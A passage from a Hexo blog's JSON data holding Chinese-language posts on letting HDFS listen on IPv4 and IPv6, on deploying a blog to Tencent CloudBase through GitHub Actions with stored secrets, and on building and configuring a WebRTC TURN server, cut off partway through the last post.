class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;**</span><br><span class=\"line\">    * Create a server with the specified port, listen backlog, and</span><br><span class=\"line\">    * local IP address to bind to.  The &lt;i&gt;bindAddr&lt;&#x2F;i&gt; argument</span><br><span class=\"line\">    * can be used on a multi-homed host for a ServerSocket that</span><br><span class=\"line\">    * will only accept connect requests to one of its addresses.</span><br><span class=\"line\">    * If &lt;i&gt;bindAddr&lt;&#x2F;i&gt; is null, it will default accepting</span><br><span class=\"line\">    * connections on any&#x2F;all local addresses.</span><br><span class=\"line\">    * The port must be between 0 and 65535, inclusive.</span><br><span class=\"line\">    * A port number of &#123;@code 0&#125; means that the port number is</span><br><span class=\"line\">    * automatically allocated, typically from an ephemeral port range.</span><br><span class=\"line\">    * This port number can then be retrieved by calling</span><br><span class=\"line\">    * &#123;@link #getLocalPort getLocalPort&#125;.</span><br><span class=\"line\">    *</span><br><span class=\"line\">    * &lt;P&gt;If there is a security manager, this method</span><br><span class=\"line\">    * calls its &#123;@code checkListen&#125; method</span><br><span class=\"line\">    * with the &#123;@code port&#125; argument</span><br><span class=\"line\">    * as its argument to ensure the operation is allowed.</span><br><span class=\"line\">    * This could result in a SecurityException.</span><br><span class=\"line\">    *</span><br><span class=\"line\">    * The &#123;@code backlog&#125; argument is the requested maximum number of</span><br><span class=\"line\">    * pending connections on the socket. Its exact semantics are implementation</span><br><span class=\"line\">    * specific. In particular, an implementation may impose a maximum length</span><br><span class=\"line\">    * or may choose to ignore the parameter altogther. The value provided</span><br><span class=\"line\">    * should be greater than &#123;@code 0&#125;. If it is less than or equal to</span><br><span class=\"line\">    * &#123;@code 0&#125;, then an implementation specific default will be used.</span><br><span class=\"line\">    * &lt;P&gt;</span><br><span class=\"line\">    * @param port  the port number, or &#123;@code 0&#125; to use a port</span><br><span class=\"line\">    *              number that is automatically allocated.</span><br><span class=\"line\">    * @param backlog requested maximum length of the queue of incoming</span><br><span class=\"line\">    *                connections.</span><br><span class=\"line\">    * @param bindAddr the local InetAddress the server will bind to</span><br><span class=\"line\">    *</span><br><span class=\"line\">    * @throws  SecurityException if a security manager exists and</span><br><span class=\"line\">    * its &#123;@code checkListen&#125; method doesn&#39;t allow the operation.</span><br><span class=\"line\">    *</span><br><span class=\"line\">    * @throws  IOException if an I&#x2F;O error occurs when opening the socket.</span><br><span class=\"line\">    * @exception  IllegalArgumentException if the port parameter is outside</span><br><span class=\"line\">    *             the specified range of valid port values, which is between</span><br><span class=\"line\">    *             0 and 65535, inclusive.</span><br><span class=\"line\">    *</span><br><span class=\"line\">    * @see SocketOptions</span><br><span class=\"line\">    * @see SocketImpl</span><br><span class=\"line\">    * @see SecurityManager#checkListen</span><br><span class=\"line\">    * @since   JDK1.1</span><br><span class=\"line\">    *&#x2F;</span><br><span class=\"line\">   public ServerSocket(int port, int backlog, InetAddress bindAddr) throws IOException &#123;</span><br><span class=\"line\">       setImpl();</span><br><span class=\"line\">       if (port &lt; 0 || port &gt; 0xFFFF)</span><br><span class=\"line\">           throw new IllegalArgumentException(</span><br><span class=\"line\">                      &quot;Port value out of range: &quot; + port);</span><br><span class=\"line\">       if (backlog &lt; 1)</span><br><span class=\"line\">         backlog &#x3D; 50;</span><br><span class=\"line\">       try &#123;</span><br><span class=\"line\">           bind(new InetSocketAddress(bindAddr, port), backlog);</span><br><span class=\"line\">       &#125; catch(SecurityException e) &#123;</span><br><span class=\"line\">           close();</span><br><span class=\"line\">           throw e;</span><br><span class=\"line\">       &#125; catch(IOException e) &#123;</span><br><span class=\"line\">           close();</span><br><span class=\"line\">           throw e;</span><br><span class=\"line\">       &#125;</span><br><span class=\"line\">   &#125;</span><br></pre></td></tr></table></figure>\n<p>我们在建离socket连接，就是tcp的连接的时候，需要传递三个参数。我去查了下这三个数的含义。从上面的注释可以发现，port表示要绑定的端口号，backlog等待建立连接的最大连接数，binAddr则就是要绑定的端口号。如果不传入binAddr这个参数，那么就会默认监听这台机器上所有地址。</p>\n<p>那么问题，基本上就简单解决了好多，我只要在建立rpc请求的时候，不绑定ip地址和端口号，那么我不就可以同时监听ipv4和ipv6的地址么。果然，我在hdfs中找到了相关的配置项。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;property&gt;</span><br><span class=\"line\">  &lt;name&gt;dfs.namenode.http-bind-host&lt;&#x2F;name&gt;</span><br><span class=\"line\">  &lt;value&gt;&lt;&#x2F;value&gt;</span><br><span class=\"line\">  &lt;description&gt;</span><br><span class=\"line\">    The actual adress the HTTP server will bind to. If this optional address</span><br><span class=\"line\">    is set, it overrides only the hostname portion of dfs.namenode.http-address.</span><br><span class=\"line\">    It can also be specified per name node or name service for HA&#x2F;Federation.</span><br><span class=\"line\">    This is useful for making the name node HTTP server listen on all</span><br><span class=\"line\">    interfaces by setting it to 0.0.0.0.</span><br><span class=\"line\">  &lt;&#x2F;description&gt;</span><br><span class=\"line\">&lt;&#x2F;property&gt;</span><br></pre></td></tr></table></figure>\n<p>果然配置成0.0.0.0，namenode的50070端口，ipv4和ipv6的端口都可以访问。</p>\n","site":{"data":{}},"excerpt":"","more":"<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><p>ipv6标准制定了这么多年，终于要开始被大力推进了。最近要求hdfs既要支持ipv4，又要支持ipv6。所以特意研究了，怎么同时能支持ipv4和ipv6。</p>\n<h3 id=\"理论基础\"><a href=\"#理论基础\" class=\"headerlink\" title=\"理论基础\"></a>理论基础</h3><p>ipv4和ipv6都是属于网络层，我们平常做的程序很少有机会去做到网络层，除非做的路由器和交换机。我们开发的程序大都是在传输层以上，基于tcp协议或者udp的协议。所以，我猜测应该我需要做的东西不是很多。找了找java建立网络的相关api。果然就被我发现了。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;**</span><br><span class=\"line\">    * Create a server with the specified port, listen backlog, and</span><br><span class=\"line\">    * local IP address to bind to.  The &lt;i&gt;bindAddr&lt;&#x2F;i&gt; argument</span><br><span class=\"line\">    * can be used on a multi-homed host for a ServerSocket that</span><br><span class=\"line\">    * will only accept connect requests to one of its addresses.</span><br><span class=\"line\">    * If &lt;i&gt;bindAddr&lt;&#x2F;i&gt; is null, it will default accepting</span><br><span class=\"line\">    * connections on any&#x2F;all local addresses.</span><br><span class=\"line\">    * The port must be between 0 and 65535, inclusive.</span><br><span class=\"line\">    * A port number of &#123;@code 0&#125; means that the port number is</span><br><span class=\"line\">    * automatically allocated, typically from an ephemeral port range.</span><br><span class=\"line\">    * This port number can then be retrieved by calling</span><br><span class=\"line\">    * &#123;@link #getLocalPort getLocalPort&#125;.</span><br><span class=\"line\">    *</span><br><span class=\"line\">    * &lt;P&gt;If there is a security manager, this method</span><br><span class=\"line\">    * calls its &#123;@code checkListen&#125; method</span><br><span class=\"line\">    * with the &#123;@code port&#125; argument</span><br><span class=\"line\">    * as its argument to ensure the operation is allowed.</span><br><span class=\"line\">    * This could result in a SecurityException.</span><br><span class=\"line\">    *</span><br><span class=\"line\">    * The &#123;@code backlog&#125; argument is the requested maximum number of</span><br><span class=\"line\">    * pending connections on the socket. Its exact semantics are implementation</span><br><span class=\"line\">    * specific. In particular, an implementation may impose a maximum length</span><br><span class=\"line\">    * or may choose to ignore the parameter altogther. The value provided</span><br><span class=\"line\">    * should be greater than &#123;@code 0&#125;. If it is less than or equal to</span><br><span class=\"line\">    * &#123;@code 0&#125;, then an implementation specific default will be used.</span><br><span class=\"line\">    * &lt;P&gt;</span><br><span class=\"line\">    * @param port  the port number, or &#123;@code 0&#125; to use a port</span><br><span class=\"line\">    *              number that is automatically allocated.</span><br><span class=\"line\">    * @param backlog requested maximum length of the queue of incoming</span><br><span class=\"line\">    *                connections.</span><br><span class=\"line\">    * @param bindAddr the local InetAddress the server will bind to</span><br><span class=\"line\">    *</span><br><span class=\"line\">    * @throws  SecurityException if a security manager exists and</span><br><span class=\"line\">    * its &#123;@code checkListen&#125; method doesn&#39;t allow the operation.</span><br><span class=\"line\">    *</span><br><span class=\"line\">    * @throws  IOException if an I&#x2F;O error occurs when opening the socket.</span><br><span class=\"line\">    * @exception  IllegalArgumentException if the port parameter is outside</span><br><span class=\"line\">    *             the specified range of valid port values, which is between</span><br><span class=\"line\">    *             0 and 65535, inclusive.</span><br><span class=\"line\">    *</span><br><span class=\"line\">    * @see SocketOptions</span><br><span class=\"line\">    * @see SocketImpl</span><br><span class=\"line\">    * @see SecurityManager#checkListen</span><br><span class=\"line\">    * @since   JDK1.1</span><br><span class=\"line\">    *&#x2F;</span><br><span class=\"line\">   public ServerSocket(int port, int backlog, InetAddress bindAddr) throws IOException &#123;</span><br><span class=\"line\">       setImpl();</span><br><span class=\"line\">       if (port &lt; 0 || port &gt; 0xFFFF)</span><br><span class=\"line\">           throw new IllegalArgumentException(</span><br><span class=\"line\">                      &quot;Port value out of range: &quot; + port);</span><br><span class=\"line\">       if (backlog &lt; 1)</span><br><span class=\"line\">         backlog &#x3D; 50;</span><br><span class=\"line\">       try &#123;</span><br><span class=\"line\">           bind(new InetSocketAddress(bindAddr, port), backlog);</span><br><span class=\"line\">       &#125; catch(SecurityException e) &#123;</span><br><span class=\"line\">           close();</span><br><span class=\"line\">           throw e;</span><br><span class=\"line\">       &#125; catch(IOException e) &#123;</span><br><span class=\"line\">           close();</span><br><span class=\"line\">           throw e;</span><br><span class=\"line\">       &#125;</span><br><span class=\"line\">   &#125;</span><br></pre></td></tr></table></figure>\n<p>我们在建离socket连接，就是tcp的连接的时候，需要传递三个参数。我去查了下这三个数的含义。从上面的注释可以发现，port表示要绑定的端口号，backlog等待建立连接的最大连接数，binAddr则就是要绑定的端口号。如果不传入binAddr这个参数，那么就会默认监听这台机器上所有地址。</p>\n<p>那么问题，基本上就简单解决了好多，我只要在建立rpc请求的时候，不绑定ip地址和端口号，那么我不就可以同时监听ipv4和ipv6的地址么。果然，我在hdfs中找到了相关的配置项。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;property&gt;</span><br><span class=\"line\">  &lt;name&gt;dfs.namenode.http-bind-host&lt;&#x2F;name&gt;</span><br><span class=\"line\">  &lt;value&gt;&lt;&#x2F;value&gt;</span><br><span class=\"line\">  &lt;description&gt;</span><br><span class=\"line\">    The actual adress the HTTP server will bind to. If this optional address</span><br><span class=\"line\">    is set, it overrides only the hostname portion of dfs.namenode.http-address.</span><br><span class=\"line\">    It can also be specified per name node or name service for HA&#x2F;Federation.</span><br><span class=\"line\">    This is useful for making the name node HTTP server listen on all</span><br><span class=\"line\">    interfaces by setting it to 0.0.0.0.</span><br><span class=\"line\">  &lt;&#x2F;description&gt;</span><br><span class=\"line\">&lt;&#x2F;property&gt;</span><br></pre></td></tr></table></figure>\n<p>果然配置成0.0.0.0，namenode的50070端口，ipv4和ipv6的端口都可以访问。</p>\n"},{"title":"通过github的actions自动化部署hexo博客","date":"2020-06-14T03:29:35.000Z","_content":"### 自动化部署的原理\n\n1.通过每次提交代码，触发github的actions去执行我们编写的脚本。\n\n2.可通过多种方式将代码上传到自己的服务器。比如scp，ftp，http上传。\n\n\n### 自定义环境变量\n\n1.我们通过scp的方式，或者ftp的方式上传我们生成好的文件。会有一个问题。我们可能会把自己的关键的密码等信息需要放置在我们编写的脚本里。\n\n2.github action支持我们自定义变量，这个变量在运行我们的脚本的时候，可以被替换掉。\n\n``` yml\n    - name: Deploy static to Tencent CloudBase\n      id: deployStatic\n      uses: TencentCloudBase/cloudbase-action@v1.1.1\n      with:\n        secretId: ${{ secrets.APIKEYID }}\n        secretKey: ${{ secrets.APIKEY }}\n        envId: fzy123-14df6e\n        staticSrcPath: public\n```\n\n其中变量 APIKEYID和 APIKEY都可以被替换掉。\n\n![图片alt](/image/1592105506385.jpg)\n\n按照上面的操作就可以替换掉。\n\n\n### 腾讯云静态文件部署\n\n如果要是用腾讯云提供的静态网站部署，可以直接参考我编写yml文件。\nhttps://github.com/fangzhenyi/fangzhenyi.GitHub.io/blob/master/.github/workflows/blank.yml\n","source":"_posts/博客增加自动化部署.md","raw":"---\ntitle: 通过github的actions自动化部署hexo博客\ndate: 2020-06-14 11:29:35\ntags: github hexo\n---\n### 自动化部署的原理\n\n1.通过每次提交代码，触发github的actions去执行我们编写的脚本。\n\n2.可通过多种方式将代码上传到自己的服务器。比如scp，ftp，http上传。\n\n\n### 自定义环境变量\n\n1.我们通过scp的方式，或者ftp的方式上传我们生成好的文件。会有一个问题。我们可能会把自己的关键的密码等信息需要放置在我们编写的脚本里。\n\n2.github action支持我们自定义变量，这个变量在运行我们的脚本的时候，可以被替换掉。\n\n``` yml\n    - name: Deploy static to Tencent CloudBase\n      id: deployStatic\n      uses: TencentCloudBase/cloudbase-action@v1.1.1\n      with:\n        secretId: ${{ secrets.APIKEYID }}\n        secretKey: ${{ secrets.APIKEY }}\n        envId: fzy123-14df6e\n        staticSrcPath: public\n```\n\n其中变量 APIKEYID和 APIKEY都可以被替换掉。\n\n![图片alt](/image/1592105506385.jpg)\n\n按照上面的操作就可以替换掉。\n\n\n### 腾讯云静态文件部署\n\n如果要是用腾讯云提供的静态网站部署，可以直接参考我编写yml文件。\nhttps://github.com/fangzhenyi/fangzhenyi.GitHub.io/blob/master/.github/workflows/blank.yml\n","slug":"博客增加自动化部署","published":1,"updated":"2020-06-14T03:35:20.122Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckox55gcs000oak9cdn51cvwm","content":"<h3 id=\"自动化部署的原理\"><a href=\"#自动化部署的原理\" class=\"headerlink\" title=\"自动化部署的原理\"></a>自动化部署的原理</h3><p>1.通过每次提交代码，触发github的actions去执行我们编写的脚本。</p>\n<p>2.可通过多种方式将代码上传到自己的服务器。比如scp，ftp，http上传。</p>\n<h3 id=\"自定义环境变量\"><a href=\"#自定义环境变量\" class=\"headerlink\" title=\"自定义环境变量\"></a>自定义环境变量</h3><p>1.我们通过scp的方式，或者ftp的方式上传我们生成好的文件。会有一个问题。我们可能会把自己的关键的密码等信息需要放置在我们编写的脚本里。</p>\n<p>2.github action支持我们自定义变量，这个变量在运行我们的脚本的时候，可以被替换掉。</p>\n<figure class=\"highlight yml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Deploy</span> <span class=\"string\">static</span> <span class=\"string\">to</span> <span class=\"string\">Tencent</span> <span class=\"string\">CloudBase</span></span><br><span class=\"line\">  <span class=\"attr\">id:</span> <span class=\"string\">deployStatic</span></span><br><span class=\"line\">  <span class=\"attr\">uses:</span> <span class=\"string\">TencentCloudBase/cloudbase-action@v1.1.1</span></span><br><span class=\"line\">  <span class=\"attr\">with:</span></span><br><span class=\"line\">    <span class=\"attr\">secretId:</span> <span class=\"string\">$&#123;&#123;</span> <span class=\"string\">secrets.APIKEYID</span> <span class=\"string\">&#125;&#125;</span></span><br><span class=\"line\">    <span class=\"attr\">secretKey:</span> <span class=\"string\">$&#123;&#123;</span> <span class=\"string\">secrets.APIKEY</span> <span class=\"string\">&#125;&#125;</span></span><br><span class=\"line\">    <span class=\"attr\">envId:</span> <span class=\"string\">fzy123-14df6e</span></span><br><span class=\"line\">    <span class=\"attr\">staticSrcPath:</span> <span class=\"string\">public</span></span><br></pre></td></tr></table></figure>\n\n<p>其中变量 APIKEYID和 APIKEY都可以被替换掉。</p>\n<p><img src=\"/image/1592105506385.jpg\" alt=\"图片alt\"></p>\n<p>按照上面的操作就可以替换掉。</p>\n<h3 id=\"腾讯云静态文件部署\"><a href=\"#腾讯云静态文件部署\" class=\"headerlink\" title=\"腾讯云静态文件部署\"></a>腾讯云静态文件部署</h3><p>如果要是用腾讯云提供的静态网站部署，可以直接参考我编写yml文件。<br><a href=\"https://github.com/fangzhenyi/fangzhenyi.GitHub.io/blob/master/.github/workflows/blank.yml\" target=\"_blank\" rel=\"noopener\">https://github.com/fangzhenyi/fangzhenyi.GitHub.io/blob/master/.github/workflows/blank.yml</a></p>\n","site":{"data":{}},"excerpt":"","more":"<h3 id=\"自动化部署的原理\"><a href=\"#自动化部署的原理\" class=\"headerlink\" title=\"自动化部署的原理\"></a>自动化部署的原理</h3><p>1.通过每次提交代码，触发github的actions去执行我们编写的脚本。</p>\n<p>2.可通过多种方式将代码上传到自己的服务器。比如scp，ftp，http上传。</p>\n<h3 id=\"自定义环境变量\"><a href=\"#自定义环境变量\" class=\"headerlink\" title=\"自定义环境变量\"></a>自定义环境变量</h3><p>1.我们通过scp的方式，或者ftp的方式上传我们生成好的文件。会有一个问题。我们可能会把自己的关键的密码等信息需要放置在我们编写的脚本里。</p>\n<p>2.github action支持我们自定义变量，这个变量在运行我们的脚本的时候，可以被替换掉。</p>\n<figure class=\"highlight yml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Deploy</span> <span class=\"string\">static</span> <span class=\"string\">to</span> <span class=\"string\">Tencent</span> <span class=\"string\">CloudBase</span></span><br><span class=\"line\">  <span class=\"attr\">id:</span> <span class=\"string\">deployStatic</span></span><br><span class=\"line\">  <span class=\"attr\">uses:</span> <span class=\"string\">TencentCloudBase/cloudbase-action@v1.1.1</span></span><br><span class=\"line\">  <span class=\"attr\">with:</span></span><br><span class=\"line\">    <span class=\"attr\">secretId:</span> <span class=\"string\">$&#123;&#123;</span> <span class=\"string\">secrets.APIKEYID</span> <span class=\"string\">&#125;&#125;</span></span><br><span class=\"line\">    <span class=\"attr\">secretKey:</span> <span class=\"string\">$&#123;&#123;</span> <span class=\"string\">secrets.APIKEY</span> <span class=\"string\">&#125;&#125;</span></span><br><span class=\"line\">    <span class=\"attr\">envId:</span> <span class=\"string\">fzy123-14df6e</span></span><br><span class=\"line\">    <span class=\"attr\">staticSrcPath:</span> <span class=\"string\">public</span></span><br></pre></td></tr></table></figure>\n\n<p>其中变量 APIKEYID和 APIKEY都可以被替换掉。</p>\n<p><img src=\"/image/1592105506385.jpg\" alt=\"图片alt\"></p>\n<p>按照上面的操作就可以替换掉。</p>\n<h3 id=\"腾讯云静态文件部署\"><a href=\"#腾讯云静态文件部署\" class=\"headerlink\" title=\"腾讯云静态文件部署\"></a>腾讯云静态文件部署</h3><p>如果要是用腾讯云提供的静态网站部署，可以直接参考我编写yml文件。<br><a href=\"https://github.com/fangzhenyi/fangzhenyi.GitHub.io/blob/master/.github/workflows/blank.yml\" target=\"_blank\" rel=\"noopener\">https://github.com/fangzhenyi/fangzhenyi.GitHub.io/blob/master/.github/workflows/blank.yml</a></p>\n"},{"title":"webrtc搭建turn服务器","date":"2016-07-16T03:29:35.000Z","_content":"\n### 1.搭建turn服务器目的\n\n部署WebRTC 或 SIP p2p 方案时经常会遇到p2p 无法穿透的环境，\n\n这时就是TunServer 的用武之地了。\n\n这里我们使用turnserver-0.7.3\n\n### 2.下载confuse依赖库\n\n```\nwget http://savannah.nongnu.org/download/confuse/confuse-2.7.tar.gz\n\ntar zxvf confuse-2.7.tar.gz\n\ncd confuse*\n\n./configure\n\nmake && make install\n```\n\n\n### 3.下载turnserver\n\n```\nwget http://downloads.sourceforge.net/project/turnserver/turnserver-0.7.3.tar.bz2 \ntar jxvf turnserver-0.7.3.tar.bz2\n\ncd turnserver*\n\n./configure\n\nmake && make install\n```\n\n### 4.编辑配置文件\n\n将extra 中的配置文件模版拷贝到/etc目录下,假设您的ip 是 1.2.3.4\n\n1，配置文件\n\n```\ncp extra/turnserver.conf.template /etc/turnserver.conf \nvi /etc/tunserver.conf\n```\n\n修改\n\nlisten_address = { \"1.2.3.4\" }\n\n修改 ## Daemon mode. daemon = true # 修改为后台服务方式\n\n修改带宽限制\n\n```\n##Allocation bandwidth limitation (in KBytes/s). ## 0 value means bandwidth quota disabled. bandwidth_per_allocation = 1024   \n##Restricted user bandwidth (in KBytes/s). ## 0 value means bandwidth limitation disabled. restricted_bandwidth = 0\n```\n\n2，认证用户文件\n\n```\ncp extra/turnusers.txt.template /etc/turnusers.txt \nvi /etc/turnusers.txt\n```\n\n\n添加一行或多行认证信息格式为 用户名:密码:domain:authorized 例如下面的行: 700:700pass:domain.org:authorized\n\n添加完成后，就可以在webrtc 里面使用stun 和tunserver 了。\n \n```var configuration = { \n'iceServers': [{ { 'url' : 'stun:1.2.3.4'} , { 'url' : ‘turn:700@1.2.3.4',credential : '700pass'} }] };\n```\n","source":"_posts/搭建webrtc-turn服务器.md","raw":"---\ntitle: webrtc搭建turn服务器\ndate: 2016-07-16 11:29:35\ntags: webrtc\n---\n\n### 1.搭建turn服务器目的\n\n部署WebRTC 或 SIP p2p 方案时经常会遇到p2p 无法穿透的环境，\n\n这时就是TunServer 的用武之地了。\n\n这里我们使用turnserver-0.7.3\n\n### 2.下载confuse依赖库\n\n```\nwget http://savannah.nongnu.org/download/confuse/confuse-2.7.tar.gz\n\ntar zxvf confuse-2.7.tar.gz\n\ncd confuse*\n\n./configure\n\nmake && make install\n```\n\n\n### 3.下载turnserver\n\n```\nwget http://downloads.sourceforge.net/project/turnserver/turnserver-0.7.3.tar.bz2 \ntar jxvf turnserver-0.7.3.tar.bz2\n\ncd turnserver*\n\n./configure\n\nmake && make install\n```\n\n### 4.编辑配置文件\n\n将extra 中的配置文件模版拷贝到/etc目录下,假设您的ip 是 1.2.3.4\n\n1，配置文件\n\n```\ncp extra/turnserver.conf.template /etc/turnserver.conf \nvi /etc/tunserver.conf\n```\n\n修改\n\nlisten_address = { \"1.2.3.4\" }\n\n修改 ## Daemon mode. daemon = true # 修改为后台服务方式\n\n修改带宽限制\n\n```\n##Allocation bandwidth limitation (in KBytes/s). ## 0 value means bandwidth quota disabled. bandwidth_per_allocation = 1024   \n##Restricted user bandwidth (in KBytes/s). ## 0 value means bandwidth limitation disabled. restricted_bandwidth = 0\n```\n\n2，认证用户文件\n\n```\ncp extra/turnusers.txt.template /etc/turnusers.txt \nvi /etc/turnusers.txt\n```\n\n\n添加一行或多行认证信息格式为 用户名:密码:domain:authorized 例如下面的行: 700:700pass:domain.org:authorized\n\n添加完成后，就可以在webrtc 里面使用stun 和tunserver 了。\n \n```var configuration = { \n'iceServers': [{ { 'url' : 'stun:1.2.3.4'} , { 'url' : ‘turn:700@1.2.3.4',credential : '700pass'} }] };\n```\n","slug":"搭建webrtc-turn服务器","published":1,"updated":"2017-08-15T14:45:40.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckox55gcu000qak9cdco8diba","content":"<h3 id=\"1-搭建turn服务器目的\"><a href=\"#1-搭建turn服务器目的\" class=\"headerlink\" title=\"1.搭建turn服务器目的\"></a>1.搭建turn服务器目的</h3><p>部署WebRTC 或 SIP p2p 方案时经常会遇到p2p 无法穿透的环境，</p>\n<p>这时就是TunServer 的用武之地了。</p>\n<p>这里我们使用turnserver-0.7.3</p>\n<h3 id=\"2-下载confuse依赖库\"><a href=\"#2-下载confuse依赖库\" class=\"headerlink\" title=\"2.下载confuse依赖库\"></a>2.下载confuse依赖库</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wget http:&#x2F;&#x2F;savannah.nongnu.org&#x2F;download&#x2F;confuse&#x2F;confuse-2.7.tar.gz</span><br><span class=\"line\"></span><br><span class=\"line\">tar zxvf confuse-2.7.tar.gz</span><br><span class=\"line\"></span><br><span class=\"line\">cd confuse*</span><br><span class=\"line\"></span><br><span class=\"line\">.&#x2F;configure</span><br><span class=\"line\"></span><br><span class=\"line\">make &amp;&amp; make install</span><br></pre></td></tr></table></figure>\n\n\n<h3 id=\"3-下载turnserver\"><a href=\"#3-下载turnserver\" class=\"headerlink\" title=\"3.下载turnserver\"></a>3.下载turnserver</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wget http:&#x2F;&#x2F;downloads.sourceforge.net&#x2F;project&#x2F;turnserver&#x2F;turnserver-0.7.3.tar.bz2 </span><br><span class=\"line\">tar jxvf turnserver-0.7.3.tar.bz2</span><br><span class=\"line\"></span><br><span class=\"line\">cd turnserver*</span><br><span class=\"line\"></span><br><span class=\"line\">.&#x2F;configure</span><br><span class=\"line\"></span><br><span class=\"line\">make &amp;&amp; make install</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"4-编辑配置文件\"><a href=\"#4-编辑配置文件\" class=\"headerlink\" title=\"4.编辑配置文件\"></a>4.编辑配置文件</h3><p>将extra 中的配置文件模版拷贝到/etc目录下,假设您的ip 是 1.2.3.4</p>\n<p>1，配置文件</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cp extra&#x2F;turnserver.conf.template &#x2F;etc&#x2F;turnserver.conf </span><br><span class=\"line\">vi &#x2F;etc&#x2F;tunserver.conf</span><br></pre></td></tr></table></figure>\n\n<p>修改</p>\n<p>listen_address = { “1.2.3.4” }</p>\n<p>修改 ## Daemon mode. daemon = true # 修改为后台服务方式</p>\n<p>修改带宽限制</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">##Allocation bandwidth limitation (in KBytes&#x2F;s). ## 0 value means bandwidth 